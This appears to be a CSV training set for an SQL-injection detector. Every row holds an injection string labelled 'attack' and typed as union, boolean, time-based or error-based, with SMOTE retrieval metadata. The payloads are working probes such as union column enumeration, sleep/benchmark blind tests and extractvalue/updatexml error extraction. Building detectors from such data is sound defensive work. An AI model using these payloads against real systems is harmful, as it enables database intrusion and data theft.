id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_001486,attack,other,""" or """"-""",nearest_attack_euclidean,R000538,0.19909658231830057
SMOTE_001487,attack,time,"1' where 7014  =  7014 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R004045,0.11473893174295263
SMOTE_001488,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  'pnst'  =  'pnst",nearest_attack_euclidean,R006637,0.11068590972140449
SMOTE_001489,attack,boolean,"1""   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R008095,0.12534915129120075
SMOTE_001490,attack,union," select * from users where id  =  1 union select @<@,version  (    )   -- 1",nearest_attack_euclidean,R000294,0.08471040086157505
SMOTE_001491,attack,union,"-3130'   )    )     )   union all select 2886,2886,2886,2886,2886,2886,2886#",nearest_attack_euclidean,R004169,0.050538888037655015
SMOTE_001492,attack,other,1   )    )    as xlww where 5844  =  5844,nearest_attack_euclidean,R004863,0.017726163034221944
SMOTE_001493,attack,time,1' in boolean mode  )   and sleep  (  5  )  #,nearest_attack_euclidean,R002626,1.027013420082896
SMOTE_001494,attack,boolean,"1"" or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and ""ljkg""  =  ""ljkg",nearest_attack_euclidean,R004815,0.3031173137483578
SMOTE_001495,attack,error,"-4830""   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  ""dyut""  =  ""dyut",nearest_attack_euclidean,R006264,1.4321577568209096
SMOTE_001496,attack,other,1  )   as ilqx where 8547  =  8547,nearest_attack_euclidean,R003156,0.0
SMOTE_001497,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  ""poik""  =  ""poik",nearest_attack_euclidean,R007125,0.37610572525719604
SMOTE_001498,attack,other,1' where 1623  =  1623,nearest_attack_euclidean,R001570,0.0
SMOTE_001499,attack,time,select sleep  (  5  )   and    (    (     (  'iwwa' like 'iwwa,nearest_attack_euclidean,R006267,0.8967771197025853
SMOTE_001500,attack,union,"-1597"" union all select 6038,6038,6038,6038,6038,6038,6038,6038,6038,6038--",nearest_attack_euclidean,R001927,0.001784028601228725
SMOTE_001501,attack,time,1  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R005460,0.2248205678829316
SMOTE_001502,attack,time,"1%""  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R001964,0.37631642689135153
SMOTE_001503,attack,union,"-2855' union all select 2495,2495,2495,2495,2495,2495,2495,2495,2495--",nearest_attack_euclidean,R008206,0.07247100625633747
SMOTE_001504,attack,union,"-1475""  )   union all select 8611,8611,8611#",nearest_attack_euclidean,R003164,0.3240627888478776
SMOTE_001505,attack,boolean,-7859  )   as ipdg where 4413  =  4413 or 9323  =  9323#,nearest_attack_euclidean,R000906,0.12862352945258437
SMOTE_001506,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R007897,0.1925546593931951
SMOTE_001507,attack,time,1'   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   'yqbo'  =  'yqbo,nearest_attack_euclidean,R003418,0.22695797189894273
SMOTE_001508,attack,union," select * from users where id  =  1 or !<@ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000363,0.17004399249715693
SMOTE_001509,attack,boolean,select * from users where id  =  1 or \.<\ or 1  =  1 -- 1,nearest_attack_euclidean,R000020,0.040925795253901186
SMOTE_001510,attack,union,-9841 where 4612  =  4612 union all select 4612--,nearest_attack_euclidean,R004488,0.5216388983625502
SMOTE_001511,attack,union,"1'   )    )     )   union all select null,null#",nearest_attack_euclidean,R008461,0.1752934737130131
SMOTE_001512,attack,boolean,"1""   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   ""oxvs"" like ""oxvs",nearest_attack_euclidean,R007199,0.05285326771327045
SMOTE_001513,attack,boolean,1'||  (  select 'ptfi' from dual where 2234  =  2234 and 2006  =  2006,nearest_attack_euclidean,R007649,0.9815838046638605
SMOTE_001514,attack,other,1 where 9872  =  9872,nearest_attack_euclidean,R000894,1.6858739404357614e-07
SMOTE_001515,attack,other,"select * from generate_series  (  2317,2317,case when   (  2317  =  9706  )   then 1 else 0 end  )   limit 1--",nearest_attack_euclidean,R002653,0.0011315270975531281
SMOTE_001516,attack,boolean,-3846%' or 6872  =  6872 and '%'  =  ',nearest_attack_euclidean,R008921,1.046510160083092
SMOTE_001517,attack,union,"-4635"" union all select 5087,5087,5087,5087,5087,5087,5087,5087,5087,5087#",nearest_attack_euclidean,R003326,0.21593896753180128
SMOTE_001518,attack,union,"1' where 1093  =  1093 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R005987,0.2107464791260235
SMOTE_001519,attack,boolean,-1036'  )   or 6872  =  6872 and   (  'wvbi'  =  'wvbi,nearest_attack_euclidean,R001177,0.01805936858008448
SMOTE_001520,attack,other,1'  )   where 6622  =  6622 order by 1--,nearest_attack_euclidean,R000789,0.3702288825983276
SMOTE_001521,attack,boolean,"1 and make_set  (  8403  =  8403,8899  )  ",nearest_attack_euclidean,R002879,2.2315132694077215
SMOTE_001522,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  6205  =  1384  )   then 1 else 0x28 end   )    )    and    (    (   'ahjf'  =  'ahjf,nearest_attack_euclidean,R008895,0.02827429163231333
SMOTE_001523,attack,boolean,"1'  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  'cqrp'  =  'cqrp",nearest_attack_euclidean,R007817,0.1288590696133177
SMOTE_001524,attack,error,1'   )    )    and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   'guxv'  =  'guxv,nearest_attack_euclidean,R001475,0.06114946652703436
SMOTE_001525,attack,union," select * from users where id  =  1 %$ 1 union select null,@@VERSION -- 1",nearest_attack_euclidean,R000271,0.2269511767572095
SMOTE_001526,attack,boolean,"1""  )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R004773,0.17401289085021973
SMOTE_001527,attack,boolean,1 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  -- slje,nearest_attack_euclidean,R005627,1.0459066172422569
SMOTE_001528,attack,other,1'  )   where 3572  =  3572,nearest_attack_euclidean,R001427,8.429369702178807e-08
SMOTE_001529,attack,union," select * from users where id  =  1 or 1#""; union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000503,0.6054571332899096
SMOTE_001530,attack,other,1  )   where 1402  =  1402,nearest_attack_euclidean,R000891,0.0
SMOTE_001531,attack,boolean,1'  )   and   (  7603  =  3634  )  *3634,nearest_attack_euclidean,R000766,0.2662536011690838
SMOTE_001532,attack,boolean," end and   (  ""vwbx""  =  ""vwbx",nearest_attack_euclidean,R000746,0.8684620565492419
SMOTE_001533,attack,boolean,1'  )   as xqbq where 1619  =  1619 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,nearest_attack_euclidean,R008509,0.12437394342449494
SMOTE_001534,attack,boolean,"1""  )   as nqtn where 5606  =  5606 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R007192,0.10069348429572698
SMOTE_001535,attack,boolean,"1%'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  '%'  =  '",nearest_attack_euclidean,R005256,0.2833416999213179
SMOTE_001536,attack,error,"-2323""  )   as zgsn where 9274  =  9274 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --",nearest_attack_euclidean,R000907,0.9875816102764816
SMOTE_001537,attack,error,"1""   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""ozvp""  =  ""ozvp",nearest_attack_euclidean,R001014,0.21897562281154934
SMOTE_001538,attack,time,"1""  )   or sleep  (  5  )  #",nearest_attack_euclidean,R005509,0.8691411276688411
SMOTE_001539,attack,union,"-4135'   )    )     )   union all select 4413,4413,4413#",nearest_attack_euclidean,R008080,0.08835915451146188
SMOTE_001540,attack,other,"1'  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  ",nearest_attack_euclidean,R007640,0.03437761771906924
SMOTE_001541,attack,boolean,-2960' or 2163  =  3143--,nearest_attack_euclidean,R002649,1.1920928955078125e-07
SMOTE_001542,attack,time,"1%""   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",nearest_attack_euclidean,R007194,0.2680798641572683
SMOTE_001543,attack,other,if  (  3831  =  9321  )   select 3831 else drop function ybru--,nearest_attack_euclidean,R001049,0.0014576677756320668
SMOTE_001544,attack,union,"-1802%'   )    )    union all select 1002,1002,1002,1002,1002,1002,1002#",nearest_attack_euclidean,R007670,0.15009841350705178
SMOTE_001545,attack,boolean,"1""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""mjkl""  =  ""mjkl",nearest_attack_euclidean,R006722,0.04950817753370848
SMOTE_001546,attack,union," select * from users where id  =  1 union select 1<@$,version  (    )   -- 1",nearest_attack_euclidean,R000172,0.11275538953465983
SMOTE_001547,attack,union,"-5425 where 5933  =  5933 union all select 5933,5933,5933--",nearest_attack_euclidean,R008658,0.10796885710225682
SMOTE_001548,attack,union,"-1368   )    )    union all select 1310,1310,1310,1310,1310#",nearest_attack_euclidean,R006712,0.08578641335325503
SMOTE_001549,attack,boolean,"1'||  (  select 'qsgi' where 1707  =  1707 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   ||'",nearest_attack_euclidean,R001237,0.235158162830457
SMOTE_001550,attack,boolean,"1%'  )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R006210,0.3438272302964484
SMOTE_001551,attack,union,"-3037  )   where 9024  =  9024 union all select 9024,9024--",nearest_attack_euclidean,R002495,0.25295869881916794
SMOTE_001552,attack,other,1'||  (  select 'yezk' where 2097  =  2097,nearest_attack_euclidean,R006958,0.0009826286879700123
SMOTE_001553,attack,boolean,1'||  (  select 'feyg' from dual where 7734  =  7734 and 3843  =  6724#,nearest_attack_euclidean,R004266,0.033829156803698336
SMOTE_001554,attack,boolean,"-9688%'   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R002368,0.16398985996797585
SMOTE_001555,attack,boolean,"-5959"" or 2477  =  1144",nearest_attack_euclidean,R004642,0.056310570830772184
SMOTE_001556,attack,boolean,end and 'aenf'  =  'aenf,nearest_attack_euclidean,R006420,0.04363235982797549
SMOTE_001557,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R007332,0.12586947401476578
SMOTE_001558,attack,boolean,"1%"" and make_set  (  2905  =  5725,5725  )   and ""%""  =  """,nearest_attack_euclidean,R008537,0.0871667608770644
SMOTE_001559,attack,other,1' where 4460  =  4460,nearest_attack_euclidean,R001515,0.0
SMOTE_001560,attack,error,"1%""  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R005484,0.044683540509464284
SMOTE_001561,attack,error,"-4032""   )    )    or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   ""olox""  =  ""olox",nearest_attack_euclidean,R006997,0.20538850996844307
SMOTE_001562,attack,error,1'   )    )    as plbt where 4368  =  4368 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,nearest_attack_euclidean,R000798,0.4380857198726892
SMOTE_001563,attack,time,"1""  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  ""fvrq""  =  ""fvrq",nearest_attack_euclidean,R007152,0.22854861382469252
SMOTE_001564,attack,time,1  )   where 8320  =  8320 waitfor delay '0:0:5'--,nearest_attack_euclidean,R002069,0.18361660347115066
SMOTE_001565,attack,other,"select * from generate_series  (  7494,7494,case when   (  7494  =  7854  )   then 1 else 0 end  )   limit 1--",nearest_attack_euclidean,R004182,0.0014946565202781253
SMOTE_001566,attack,error,"1'   )    )    and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   'tnfm' like 'tnfm",nearest_attack_euclidean,R008163,0.1701065180259569
SMOTE_001567,attack,other,"1   )    )    as bebl where 2597  =  2597   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",nearest_attack_euclidean,R004473,1.1009354480517302
SMOTE_001568,attack,union,"1""  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R007874,0.12555439106727107
SMOTE_001569,attack,boolean,"1%"" and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R002321,0.0036244468939582676
SMOTE_001570,attack,time,1   )    )    as beld where 1679  =  1679 or sleep  (  5  )  #,nearest_attack_euclidean,R007770,0.33099417726895014
SMOTE_001571,attack,boolean,"-6747"" or 9323  =  9323#",nearest_attack_euclidean,R001094,0.06560778685536547
SMOTE_001572,attack,error,"1"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""ygzq"" like ""ygzq",nearest_attack_euclidean,R003839,0.28116686145575753
SMOTE_001573,attack,boolean,"1%""  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R001323,0.028982358954808485
SMOTE_001574,attack,union,"-2667  )   union all select 5848,5848,5848,5848--",nearest_attack_euclidean,R004346,0.30675640375459073
SMOTE_001575,attack,time,"1%""   )    )     )   and sleep  (  5  )  #",nearest_attack_euclidean,R003059,0.02154732239966375
SMOTE_001576,attack,union," select * from users where id  =  1 +1<@ union select null,version  (    )   -- 1",nearest_attack_euclidean,R000489,0.10415313397137738
SMOTE_001577,attack,other,"-7416"" where 7656  =  7656 order by 1--",nearest_attack_euclidean,R001091,0.9801913955776334
SMOTE_001578,attack,error,"1'   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  'eugs'  =  'eugs",nearest_attack_euclidean,R001102,0.06864085597543908
SMOTE_001579,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   4982  =  4982,nearest_attack_euclidean,R004092,0.21240613744317322
SMOTE_001580,attack,boolean,"1""  )   as lkzz where 3565  =  3565 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R002149,0.03758403438522795
SMOTE_001581,attack,time,"1%'   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R004812,1.093729827874332
SMOTE_001582,attack,other,1'+  (  select iutk where 6158  =  6158,nearest_attack_euclidean,R001350,0.0
SMOTE_001583,attack,union,"-4371'   )    )     )   union all select 7465,7465,7465,7465,7465,7465,7465#",nearest_attack_euclidean,R006001,0.13277337206519216
SMOTE_001584,attack,boolean,-2303'   )    )    as exyt where 2528  =  2528 or 8571  =  8571--,nearest_attack_euclidean,R005015,0.2550336764834843
SMOTE_001585,attack,other,1'+  (  select 'dpun' where 4760  =  4760,nearest_attack_euclidean,R002791,0.0
SMOTE_001586,attack,error,"1'  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  'efwq' like 'efwq",nearest_attack_euclidean,R006573,0.04970575161074304
SMOTE_001587,attack,boolean,"1' where 4149  =  4149 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R002335,0.032023863489840716
SMOTE_001588,attack,time,"1   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  6556  =  6556",nearest_attack_euclidean,R004678,0.33967507480972353
SMOTE_001589,attack,time,1'  )   as xrap where 5523  =  5523 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R005004,0.23500542446115022
SMOTE_001590,attack,time,"1 where 7158  =  7158 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R006285,0.051549314034365905
SMOTE_001591,attack,boolean,1'  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  'gzpx'  =  'gzpx,nearest_attack_euclidean,R005819,0.02668139651228653
SMOTE_001592,attack,other,//*,nearest_attack_euclidean,R000618,2.0092859650687696
SMOTE_001593,attack,time,1  )   as gfhf where 5804  =  5804 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R005949,0.08490446511037014
SMOTE_001594,attack,union,"-6554'   )    )     )   union all select 4384,4384,4384,4384,4384#",nearest_attack_euclidean,R002948,0.16785146023540792
SMOTE_001595,attack,boolean," select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1",nearest_attack_euclidean,R000041,0.11736659915041417
SMOTE_001596,attack,error,"-5294%""  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  ""%""  =  """,nearest_attack_euclidean,R005270,0.019889931644710958
SMOTE_001597,attack,time,1'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  'zqiw'  =  'zqiw,nearest_attack_euclidean,R002717,0.2634524632376294
SMOTE_001598,attack,boolean,"1' where 6953  =  6953 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R006298,0.011997460496638572
SMOTE_001599,attack,boolean,-2504'   )    )     )   or 8723  =  9715,nearest_attack_euclidean,R005070,0.041412528302309855
SMOTE_001600,attack,union," select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'",nearest_attack_euclidean,R000049,0.05944774051981903
SMOTE_001601,attack,time,1'+  (  select brgo where 9100  =  9100 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R006091,0.17316853471061613
SMOTE_001602,attack,boolean,"1'   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'miba'  =  'miba",nearest_attack_euclidean,R003119,0.09457991944396629
SMOTE_001603,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R003618,0.2642520545682147
SMOTE_001604,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R007608,0.34684081611739725
SMOTE_001605,attack,boolean,"1'||  (  select 'eayf' where 5431  =  5431 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null   )    )   ||'",nearest_attack_euclidean,R003459,0.34417791555170096
SMOTE_001606,attack,other,"1'   )    )    as ovbz where 3203  =  3203   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",nearest_attack_euclidean,R008835,0.2964684391320224
SMOTE_001607,attack,union,"1  )   as zdym where 1578  =  1578 union all select null,null,null#",nearest_attack_euclidean,R006480,0.008414470501353386
SMOTE_001608,attack,union,1%'   )    )    union all select null#,nearest_attack_euclidean,R003560,0.016956292082911693
SMOTE_001609,attack,boolean,"1' in boolean mode  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  #",nearest_attack_euclidean,R004294,0.37257797514550034
SMOTE_001610,attack,boolean,"1'  )   and make_set  (  6488  =  5525,5525  )  ",nearest_attack_euclidean,R008624,0.3263115948148873
SMOTE_001611,attack,other,"iif  (  1157  =  4542,1,1/0  )  ",nearest_attack_euclidean,R001306,0.006997162269070922
SMOTE_001612,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000013,0.0
SMOTE_001613,attack,boolean,"-7559"" or 8792  =  6905--",nearest_attack_euclidean,R002348,0.22523383868925465
SMOTE_001614,attack,union," select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000072,0.0
SMOTE_001615,attack,time,"1   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  6556  =  6556",nearest_attack_euclidean,R004678,0.2300158215536675
SMOTE_001616,attack,time,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   ",nearest_attack_euclidean,R007682,1.0451308076344117
SMOTE_001617,attack,other,*/*,nearest_attack_euclidean,R009044,1.640763320773478
SMOTE_001618,attack,other,"  (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",nearest_attack_euclidean,R004381,0.35268956987457684
SMOTE_001619,attack,boolean,"-8327 where 7555  =  7555 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R003920,0.002813931641195539
SMOTE_001620,attack,boolean,"1"" and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and ""wrbs"" like ""wrbs",nearest_attack_euclidean,R001827,0.20884816994118374
SMOTE_001621,attack,boolean,"-9136'  )   or make_set  (  9354  =  9354,7185  )  ",nearest_attack_euclidean,R005013,0.054223727937534244
SMOTE_001622,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  'tnvm' like 'tnvm",nearest_attack_euclidean,R004654,0.1380195249179233
SMOTE_001623,attack,boolean,-6144'  )   or 9385  =  2474--,nearest_attack_euclidean,R001413,0.10211607960875109
SMOTE_001624,attack,error,"-3063%""   )    )     )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R006806,1.2303640223534746
SMOTE_001625,attack,other,"1""  )   where 9861  =  9861",nearest_attack_euclidean,R001050,0.0
SMOTE_001626,attack,other,"select dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  70  )  ||chr  (  106  )  ||chr  (  78  )  ,5  )   from dual--",nearest_attack_euclidean,R001818,1.2298455931704548
SMOTE_001627,attack,boolean,"1%""   )    )    and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R002906,0.06514121402217447
SMOTE_001628,attack,union," select * from users where id  =  1.  union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000426,8.429369702178807e-08
SMOTE_001629,attack,boolean,"1'   )    )    as qhpv where 7049  =  7049 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R006339,0.031329071127968795
